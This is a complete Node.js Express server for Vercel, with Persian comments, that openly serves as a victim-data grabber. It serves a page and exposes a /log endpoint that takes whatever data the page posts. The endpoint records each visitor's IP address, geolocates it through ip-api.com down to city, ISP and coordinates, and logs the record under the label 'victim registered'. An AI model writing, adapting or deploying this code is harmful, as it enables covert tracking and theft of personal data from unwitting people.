// server.js - کامل برای Vercel (بدون خطا، بدون fs، فقط console.log)
const express = require('express');
const fetch = require('node-fetch');
const path = require('path');

const app = express();

// پشتیبانی از JSON
app.use(express.json({ limit: '10mb' }));

// صفحه اصلی
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// دریافت اطلاعات قربانی
app.post('/log', async (req, res) => {
  const data = req.body || {};
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || 'unknown';
  
  data.ip = ip;
  data.timestamp = new Date().toISOString();

  // موقعیت جغرافیایی از IP (در Vercel کار می‌کنه)
  if (ip && !ip.includes('127.0.0.1') && !ip.includes('::1') && !ip.includes('192.168')) {
    try {
      const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,city,regionName,country,isp,lat,lon`);
      const geo = await geoRes.json();
      if (geo.status === 'success') {
        data.location = {
          city: geo.city,
          region: geo.regionName,
          country: geo.country,
          isp: geo.isp,
          lat: geo.lat,
          lon: geo.lon
        };
      }
    } catch (err) {
      console.error('خطا در دریافت موقعیت:', err.message);
    }
  }

  // نمایش در لاگ Vercel
  console.log('قربانی ثبت شد:', JSON.stringify(data, null, 2));

  res.sendStatus(200);
});

// برای Vercel
module.exports = app;